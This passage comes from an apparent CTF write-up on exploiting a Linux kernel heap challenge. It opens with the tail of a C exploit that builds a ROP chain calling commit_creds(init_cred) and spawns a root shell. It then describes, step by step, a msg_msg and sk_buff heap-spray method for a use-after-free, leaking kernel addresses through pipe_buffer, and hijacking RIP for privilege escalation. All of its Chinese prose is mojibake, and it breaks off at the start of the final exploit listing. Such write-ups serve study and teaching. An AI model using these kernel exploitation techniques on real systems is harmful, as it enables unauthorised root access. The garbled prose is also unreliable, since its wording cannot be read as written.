<span class="comment">// add a obj to pass detection in set_freepointer() in free_msg</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ret = msgrcv(ms_qid[<span class="number">0</span>], buf, <span class="number">1024</span> - <span class="number">0x30</span>, <span class="number">0</span>, IPC_NOWAIT | MSG_NOERROR); <span class="comment">// constructing A-&gt;B-&gt;A</span></span><br><span class="line">    <span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[x] msgrcv!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// regain UAF</span></span><br><span class="line">    pipe(pipe_fd);</span><br><span class="line">    pipe_fd_1 = pipe_fd[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    pipe(pipe_fd2);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(buf, <span class="string">&#x27;B&#x27;</span>, <span class="number">0x1000</span>);</span><br><span class="line">    buf[<span class="number">2</span>] = fake_ops_addr;</span><br><span class="line">    buf[<span class="number">1</span>] = <span class="number">0xffffffff812dbede</span> + kernel_offset; <span class="comment">// push rsi ; pop rsp ; pop 4 val ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// construct ROP</span></span><br><span class="line">    rop_idx = <span class="number">4</span>;</span><br><span class="line">    buf[rop_idx++] = POP_RDI_RET + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = INIT_CRED + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = COMMIT_CREDS + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + <span class="number">0x16</span> + kernel_offset;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = *(<span class="type">size_t</span>*)<span class="string">&quot;arttnba3&quot;</span>;</span><br><span class="line">    buf[rop_idx++] = getRootShell;</span><br><span class="line">    buf[rop_idx++] = user_cs;</span><br><span class="line">    buf[rop_idx++] = user_rflags;</span><br><span class="line">    buf[rop_idx++] = user_sp;</span><br><span class="line">    buf[rop_idx++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake ops: %p, gadget: %p\n&quot;</span>, buf[<span class="number">2</span>], buf[<span class="number">1</span>]);</span><br><span class="line">    setxattr(<span class="string">&quot;/tmp/exp&quot;</span>, <span class="string">&quot;arttnba3&quot;</span>, buf, <span class="number">0x2e0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//    sleep(5);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// trigger</span></span><br><span class="line">    close(pipe_fd[<span class="number">0</span>]);</span><br><span class="line">    close(pipe_fd[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[?] YOU FAILED? zen me hui shi ne?&quot;</span>);</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸ä¸€å®šæ¯æ¬¡éƒ½èƒ½æˆåŠŸï¼ˆç”±äºå¼€äº† freelist éšæœºåŒ–çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¹¶ä¸èƒ½ä¿è¯è¿›è¡Œ UAF çš„ object å¾€é«˜åœ°å€ä¸€å®šä¼šæœ‰ msg_msg ç»“æ„ä½“ï¼‰ï¼Œä½†æ˜¯ç»ç¬”è€…å®æµ‹æˆåŠŸç‡è¿˜æ˜¯ä¸ä½çš„</p><p><img src="https://s2.loli.net/2022/02/25/SXBzMHaNqKLmPTG.png" alt="image.png"></p><h2 id="è§£æ³•äºŒï¼šmsg-msg-sk-buff-å †å–·"><a href="#è§£æ³•äºŒï¼šmsg-msg-sk-buff-å †å–·" class="headerlink" title="è§£æ³•äºŒï¼šmsg_msg + sk_buff å †å–·"></a>è§£æ³•äºŒï¼šmsg_msg + sk_buff å †å–·</h2><h3 id="Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—"><a href="#Step-I-å †å–·-msg-msg-ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—" class="headerlink" title="Step.I å †å–· msg_msg ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—"></a>Step.I å †å–· <code>msg_msg</code> ï¼Œå»ºç«‹ä¸»ä»æ¶ˆæ¯é˜Ÿåˆ—</h3><p>æ—¢ç„¶æˆ‘ä»¬ç°åœ¨æœ‰äº†ä¸€ä¸ªUAFçš„æœºä¼šï¼Œé‚£ä¹ˆé€‰ç”¨ä»€ä¹ˆæ ·çš„ç»“æ„ä½“ä½œä¸º victim å‘¢ï¼Ÿè¿™é‡Œæˆ‘ä»¬é€‰æ‹©ä½¿ç”¨ <code>msg_msg</code> è¿™ä¸€ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* one msg_msg structure for each message */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msg</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">m_list</span>;</span></span><br><span class="line"><span class="type">long</span> m_type;</span><br><span class="line"><span class="type">size_t</span> m_ts;<span class="comment">/* message text size */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">msg_msgseg</span> *<span class="title">next</span>;</span></span><br><span class="line"><span class="type">void</span> *security;</span><br><span class="line"><span class="comment">/* the actual message follows immediately */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å½“æˆ‘ä»¬åœ¨ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€å¤šä¸ªæ¶ˆæ¯æ—¶ï¼Œä¼šå½¢æˆå¦‚ä¸‹ç»“æ„ï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨ä¸€å¼€å§‹æ—¶å…ˆé€šè¿‡ d3kheap è®¾å¤‡æä¾›çš„åŠŸèƒ½å…ˆè·å–ä¸€ä¸ª object åé‡Šæ”¾ï¼Œä¹‹åå †å–·å¤šä¸ªæ¶ˆæ¯é˜Ÿåˆ—ï¼Œå¹¶åˆ†åˆ«åœ¨æ¯ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—ä¸Šå‘é€ä¸¤æ¡æ¶ˆæ¯ï¼Œå½¢æˆå¦‚ä¸‹å†…å­˜å¸ƒå±€ï¼Œè¿™é‡Œä¸ºäº†ä¾¿åˆ©åç»­åˆ©ç”¨ï¼Œç¬¬ä¸€æ¡æ¶ˆæ¯ï¼ˆä¸»æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 96ï¼Œç¬¬äºŒæ¡æ¶ˆæ¯ï¼ˆè¾…åŠ©æ¶ˆæ¯ï¼‰çš„å¤§å°ä¸º 0x400ï¼š</p><p><img src="https://s2.loli.net/2022/03/31/ViAM3gDxpl1kQj9.png" alt="image.png"></p><p>æ­¤æ—¶<strong>æˆ‘ä»¬çš„è¾…åŠ©æ¶ˆæ¯ä¾¿æœ‰æå¤§çš„æ¦‚ç‡è·å–åˆ°ä¹‹å‰é‡Šæ”¾çš„ object</strong></p><blockquote><p>åˆ©ç”¨ <code>MSG_COPY</code> æ ‡å¿—ä½å¯ä»¥è¯»å–æ¶ˆæ¯é˜Ÿåˆ—ä¸Šçš„æ¶ˆæ¯è€Œä¸é‡Šæ”¾ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-II-æ„é€ -UAFï¼Œå †å–·-sk-buff-å®šä½-victim-é˜Ÿåˆ—"><a href="#Step-II-æ„é€ -UAFï¼Œå †å–·-sk-buff-å®šä½-victim-é˜Ÿåˆ—" class="headerlink" title="Step.II æ„é€  UAFï¼Œå †å–· sk_buff å®šä½ victim é˜Ÿåˆ—"></a>Step.II æ„é€  UAFï¼Œå †å–· <code>sk_buff</code> å®šä½ victim é˜Ÿåˆ—</h3><p>æ­¤æ—¶æˆ‘ä»¬ç›´æ¥åˆ©ç”¨é¢˜ç›®çš„åŠŸèƒ½å°†è¾…åŠ©æ¶ˆæ¯é‡Šæ”¾æ‰ï¼Œä¾¿èƒ½æˆåŠŸå®Œæˆ UAF çš„æ„å»ºï¼Œæ­¤æ—¶<strong>æˆ‘ä»¬ä»èƒ½é€šè¿‡å…¶ä¸­ä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—è®¿é—®åˆ°è¯¥è¾…åŠ©æ¶ˆæ¯å¯¹åº” objectï¼Œä½†å®é™…ä¸Šè¿™ä¸ª object å·²ç»åœ¨ freelist ä¸Šäº†</strong></p><p><img src="https://s2.loli.net/2022/05/17/sCflaOFvMSzhGUV.png" alt="image.png"></p><p>ä½†æ­¤æ—¶æˆ‘ä»¬æ— æ³•å¾—çŸ¥æ˜¯å“ªä¸€ä¸ªæ¶ˆæ¯é˜Ÿåˆ—å‘½ä¸­äº† UAF objectï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬é€‰ç”¨ <code>sk_buff</code> å †å–·åŠ«æŒè¯¥ç»“æ„ä½“</p><p>ç±»ä¼¼äº <code>msg_msg</code>ï¼Œå…¶åŒæ ·å¯ä»¥æä¾›è¿‘ä¹ä»»æ„å¤§å°å¯¹è±¡çš„åˆ†é…å†™å…¥ä¸é‡Šæ”¾ï¼Œä½†ä¸åŒçš„æ˜¯ <code>msg_msg</code> ç”±ä¸€ä¸ª header åŠ ä¸Šç”¨æˆ·æ•°æ®ç»„æˆï¼Œè€Œ <code>sk_buff</code> æœ¬èº«ä¸åŒ…å«ä»»ä½•ç”¨æˆ·æ•°æ®ï¼Œ<strong>ç”¨æˆ·æ•°æ®å•ç‹¬å­˜æ”¾åœ¨ä¸€ä¸ª object å½“ä¸­ï¼Œè€Œ sk_buff ä¸­å­˜æ”¾æŒ‡å‘ç”¨æˆ·æ•°æ®çš„æŒ‡é’ˆ</strong></p><p><img src="https://s2.loli.net/2022/03/31/AV8HsnZj2bUCl4J.png" alt="image.png"></p><p>è‡³äºè¿™ä¸ªç»“æ„ä½“çš„åˆ†é…ä¸é‡Šæ”¾ä¹Ÿæ˜¯ååˆ†ç®€å•ï¼Œ<strong>sk_buff åœ¨å†…æ ¸ç½‘ç»œåè®®æ ˆä¸­ä»£è¡¨ä¸€ä¸ªã€ŒåŒ…ã€ï¼Œ</strong>æˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬åªéœ€è¦åˆ›å»ºä¸€å¯¹ socketï¼Œåœ¨ä¸Šé¢å‘é€ä¸æ¥æ”¶æ•°æ®åŒ…å°±èƒ½å®Œæˆ sk_buff çš„åˆ†é…ä¸é‡Šæ”¾</strong>ï¼Œæœ€ç®€å•çš„åŠæ³•ä¾¿æ˜¯ç”¨ socketpair ç³»ç»Ÿè°ƒç”¨åˆ›å»ºä¸€å¯¹ socketï¼Œä¹‹åå¯¹å…¶ read &amp; write ä¾¿èƒ½å®Œæˆæ”¶å‘åŒ…çš„å·¥ä½œ</p><p>é‚£ä¹ˆæˆ‘ä»¬åˆ©ç”¨ <code>sk_buff</code> å †å–·å‘è¿™ä¸ª UAF object ä¸­å†™å…¥ä»€ä¹ˆæ•°æ®å‘¢ï¼Ÿå…¶å®è¿™é‡Œæˆ‘ä»¬å¯ä»¥éšä¾¿å†™å…¥ä¸€äº›å†…å®¹ï¼Œä¹‹åæˆ‘ä»¬ä½¿ç”¨ <code>MSG_COPY</code> flag è¿›è¡Œæ¶ˆæ¯æ‹·è´æ—¶ä¾¿ä¼šå¤±è´¥ï¼Œä½†ä¸ä¼š kernel panicï¼Œ<strong>å› æ­¤æˆ‘ä»¬å¯ä»¥é€šè¿‡åˆ¤æ–­æ˜¯å¦è¯»å–æ¶ˆæ¯å¤±è´¥æ¥å®šä½å‘½ä¸­ UAF çš„æ¶ˆæ¯é˜Ÿåˆ—</strong></p><h3 id="Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€"><a href="#Step-III-å †å–·-sk-buff-ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ²-UAF-obj-åœ°å€" class="headerlink" title="Step.III å †å–· sk_buff ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€"></a>Step.III å †å–· <code>sk_buff</code> ä¼ªé€ è¾…åŠ©æ¶ˆæ¯ï¼Œæ³„éœ² UAF obj åœ°å€</h3><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘å¦‚ä½•ç»§ç»­åˆ©ç”¨è¿™ä¸ª UAFï¼Œç”±äºå…¶ä½äºæ¶ˆæ¯é˜Ÿåˆ—ä¸Šï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„æ€§è´¨æ¥å®Œæˆåˆ©ç”¨</p><p>é¦–å…ˆæˆ‘ä»¬è€ƒè™‘å¦‚ä½•é€šè¿‡ä¼ªé€  <code>msg_msg</code> ç»“æ„ä½“å®Œæˆä¿¡æ¯æ³„éœ²ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯å¯ä»¥ä¼ªé€ ä¸€ä¸ª <code>msg_msg</code> ç»“æ„ä½“ï¼Œå°†å…¶ <code>m_ts</code> åŸŸè®¾ä¸ºä¸€ä¸ªè¾ƒå¤§å€¼ï¼Œ<strong>ä»è€Œè¶Šç•Œè¯»å–åˆ°ç›¸é‚»è¾…åŠ©æ¶ˆæ¯çš„ headerï¼Œæ³„éœ²å‡ºå †ä¸Šåœ°å€</strong></p><p>æˆ‘ä»¬æ³„éœ²å‡ºæ¥çš„æ˜¯å“ªä¸ªåœ°å€ï¼Ÿè®©æˆ‘ä»¬é‡æ–°å°†ç›®å…‰æ”¾å›åˆ°æ¶ˆæ¯é˜Ÿåˆ—çš„ç»“æ„ä¸Šï¼š</p><p><img src="https://s2.loli.net/2022/02/24/wjzFeZiDUpxXVKJ.png" alt="image.png"></p><p>æˆ‘ä»¬ä¸éš¾çŸ¥é“çš„æ˜¯ï¼Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ prev æŒ‡é’ˆæŒ‡å‘å…¶ä¸»æ¶ˆæ¯ï¼Œè€Œè¯¥è¾…åŠ©æ¶ˆæ¯çš„ next æŒ‡é’ˆæŒ‡å‘è¯¥æ¶ˆæ¯é˜Ÿåˆ—çš„ <code>msg_queue</code> ç»“æ„ï¼Œè¿™æ˜¯ç›®å‰æˆ‘ä»¬å·²çŸ¥çš„ä¸¤ä¸ªâ€œå †ä¸Šåœ°å€â€</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ä¼ªé€  <code>msg_msg-&gt;next</code>ï¼Œ<strong>å°†å…¶æŒ‡å‘æˆ‘ä»¬çš„ UAF object ç›¸é‚»çš„è¾…åŠ©æ¶ˆæ¯å¯¹åº”çš„ä¸»æ¶ˆæ¯å¤´éƒ¨å¾€å‰ï¼Œä»è€Œè¯»å‡ºè¯¥ä¸»æ¶ˆæ¯çš„å¤´éƒ¨ï¼Œæ³„éœ²å‡ºå¯¹åº”çš„è¾…åŠ©æ¶ˆæ¯çš„åœ°å€</strong>ï¼Œæœ‰äº†è¿™ä¸ªè¾…åŠ©æ¶ˆæ¯çš„åœ°å€ï¼Œå†å‡å» 0x400 <strong>ä¾¿æ˜¯æˆ‘ä»¬çš„ UAF å¯¹è±¡çš„åœ°å€</strong></p><blockquote><p>é€šè¿‡ä¼ªé€  msg_msg-&gt;next å¯ä»¥å®Œæˆä»»æ„åœ°å€è¯»ï¼Œå‚è§<a href="https://arttnba3.cn/2021/11/29/NOTE-0X08-LINUX-KERNEL-PWN-PART-IV/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%E2%80%9C%E8%8F%9C%E5%8D%95%E5%A0%86%E2%80%9D">è¿™é‡Œ</a></p></blockquote><h3 id="Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"><a href="#Step-IV-å †å–·-pipe-bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€" class="headerlink" title="Step.IV å †å–· pipe_bufferï¼Œæ³„éœ²å†…æ ¸åŸºå€"></a>Step.IV å †å–· <code>pipe_buffer</code>ï¼Œæ³„éœ²å†…æ ¸åŸºå€</h3><p>ç°åœ¨æˆ‘ä»¬å·²çŸ¥äº†å¯æ§åŒºåŸŸçš„åœ°å€ï¼Œæ¥ä¸‹æ¥è®©æˆ‘ä»¬æ¥è€ƒè™‘æ³„éœ²å†…æ ¸ .text æ®µçš„åŸºå€ï¼Œä»¥åŠå¦‚ä½•åŠ«æŒ RIP å®Œæˆææƒ</p><p>ä¹‹å‰æˆ‘ä»¬ä¸ºä»€ä¹ˆå°†è¾…åŠ©æ¶ˆæ¯çš„å¤§å°è®¾ä¸º 0x400ï¼Ÿé™¤äº†æ–¹ä¾¿å¯¹é½ä»¥å¤–ï¼Œè¿˜æœ‰ä¸€å±‚è€ƒè™‘å°±æ˜¯è¿™ä¸ªå¤§å°åˆšå¥½æœ‰ä¸€ä¸ªååˆ†å®ç”¨çš„ç»“æ„ä½“ <code>pipe_buffer</code> æ•°ç»„ï¼Œ<strong>æ—¢èƒ½å¸®æˆ‘ä»¬æ³„éœ²å†…æ ¸ä»£ç æ®µåŸºå€ï¼Œä¹Ÿèƒ½å¸®æˆ‘ä»¬åŠ«æŒ RIP</strong></p><p>å½“æˆ‘ä»¬åˆ›å»ºä¸€ä¸ªç®¡é“æ—¶ï¼Œåœ¨å†…æ ¸ä¸­ä¼šç”Ÿæˆæ•°ä¸ªè¿ç»­çš„ <code>pipe_buffer</code> ç»“æ„ä½“ï¼Œç”³è¯·çš„å†…å­˜æ€»å¤§å°åˆšå¥½ä¼šè®©å†…æ ¸ä» kmalloc-1k ä¸­å–å‡ºä¸€ä¸ª object</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *struct pipe_buffer - a linux kernel pipe buffer</span></span><br><span class="line"><span class="comment"> *@page: the page containing the data for the pipe buffer</span></span><br><span class="line"><span class="comment"> *@offset: offset of data inside the @page</span></span><br><span class="line"><span class="comment"> *@len: length of data inside the @page</span></span><br><span class="line"><span class="comment"> *@ops: operations associated with this buffer. See @pipe_buf_operations.</span></span><br><span class="line"><span class="comment"> *@flags: pipe buffer flags. See above.</span></span><br><span class="line"><span class="comment"> *@private: private data owned by the ops.</span></span><br><span class="line"><span class="comment"> **/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨ <code>pipe_buffer</code> ä¸­å­˜åœ¨ä¸€ä¸ªå‡½æ•°è¡¨æˆå‘˜ <code>pipe_buf_operations</code> ï¼Œå…¶æŒ‡å‘å†…æ ¸ä¸­çš„å‡½æ•°è¡¨ <code>anon_pipe_buf_ops</code>ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿå°†å…¶è¯»å‡ºï¼Œä¾¿èƒ½æ³„éœ²å‡ºå†…æ ¸åŸºå€ï¼Œæ“ä½œå¦‚ä¸‹ï¼š</p><ul><li>åˆ©ç”¨ <code>sk_buff</code> ä¿®å¤è¾…åŠ©æ¶ˆæ¯ï¼Œä¹‹åä»æ¶ˆæ¯é˜Ÿåˆ—ä¸­æ¥æ”¶è¯¥è¾…åŠ©æ¶ˆæ¯ï¼Œæ­¤æ—¶è¯¥ object é‡å› slub ä¸­ï¼Œä½† <code>sk_buff</code> ä»æŒ‡å‘è¯¥ object</li><li>å–·å°„ <code>pipe_buffer</code>ï¼Œä¹‹åå†æ¥æ”¶ <code>sk_buff</code> æ•°æ®åŒ…ï¼Œ<strong>æˆ‘ä»¬ä¾¿èƒ½è¯»å‡º pipe_buffer ä¸Šæ•°æ®ï¼Œæ³„éœ²å†…æ ¸åŸºå€</strong></li></ul><h3 id="Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ"><a href="#Step-V-ä¼ªé€ -pipe-bufferï¼Œæ„é€ -ROPï¼ŒåŠ«æŒ-RIPï¼Œå®Œæˆææƒ" class="headerlink" title="Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ"></a>Step.V ä¼ªé€  pipe_bufferï¼Œæ„é€  ROPï¼ŒåŠ«æŒ RIPï¼Œå®Œæˆææƒ</h3><p>å½“æˆ‘ä»¬å…³é—­äº†ç®¡é“çš„ä¸¤ç«¯æ—¶ï¼Œä¼šè§¦å‘ <code>pipe_buffer-&gt;pipe_buffer_operations-&gt;release</code> è¿™ä¸€æŒ‡é’ˆï¼Œè€Œ UAF object çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œå› æ­¤<strong>æˆ‘ä»¬å¯ä»¥ç›´æ¥åˆ©ç”¨ sk_buff åœ¨ UAF object ä¸Šä¼ªé€ å‡½æ•°è¡¨ä¸æ„é€  ROP chainï¼Œå†é€‰ä¸€æ¡è¶³å¤Ÿåˆé€‚çš„ gadget å®Œæˆæ ˆè¿ç§»ä¾¿èƒ½åŠ«æŒ RIP å®Œæˆææƒ</strong></p><p><img src="https://s2.loli.net/2022/05/17/MjuSNf7tmw64hTn.png" alt="image.png"></p><h3 id="Final-EXPLOIT"><a href="#Final-EXPLOIT" class="headerlink" title="Final EXPLOIT"></a>Final EXPLOIT</h3><p>æœ€ç»ˆçš„ exp å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span 